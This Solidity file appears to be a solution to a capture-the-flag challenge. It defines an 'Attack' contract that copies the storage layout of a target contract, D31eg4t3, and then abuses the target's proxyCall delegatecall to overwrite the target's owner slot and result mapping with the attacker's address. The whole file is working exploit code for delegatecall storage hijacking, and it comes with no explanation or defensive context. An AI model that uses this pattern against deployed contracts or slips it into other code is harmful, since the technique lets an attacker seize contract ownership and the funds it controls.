// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}


contract Attack {
    address internal immutable victim;

    // Aligning storage layout with D31eg4t3
    uint256 internal var0;
    uint8 internal var1;
    string internal var2;
    address internal var3;
    uint8 internal var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address _victim) {
        victim = _victim;
    }

    // Function to change owner - mimics a potential function in D31eg4t3
    function changeOwner(address _newOwner) public {
        owner = _newOwner;
        result[_newOwner] = true;
    }

    // Function to initiate the exploit
    function exploit() external {
        // Correctly encoding the call to changeOwner with the new owner's address (the attacker's address)
        bytes memory data = abi.encodeWithSelector(this.changeOwner.selector, msg.sender);
        
        // Triggering the delegatecall via proxyCall in D31eg4t3
        (bool success, ) = victim.call(abi.encodeWithSelector(ID31eg4t3(victim).proxyCall.selector, data));
        require(success, "Delegatecall failed");
    }
}






